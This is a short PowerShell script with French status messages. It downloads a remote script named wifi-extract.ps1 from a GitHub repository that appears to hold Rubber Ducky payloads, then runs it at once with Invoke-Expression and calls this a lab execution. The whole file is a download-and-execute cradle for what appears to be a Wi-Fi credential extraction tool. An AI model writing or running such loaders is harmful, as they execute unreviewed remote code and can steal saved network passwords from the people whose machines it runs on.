param(
    [string]$Url = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/Leonardo/scripts/wifi-extract.ps1'
)

Write-Host "GET $Url"
try {
    $script = Invoke-RestMethod -Uri $Url -UseBasicParsing
    Write-Host "OK ($($script.Length) chars). Exécution lab..."
    Invoke-Expression $script
} catch {
    Write-Error $_
    Write-Host "Si 404 : repo vide, mauvaise branche, ou repo privé sans auth."
    exit 1
}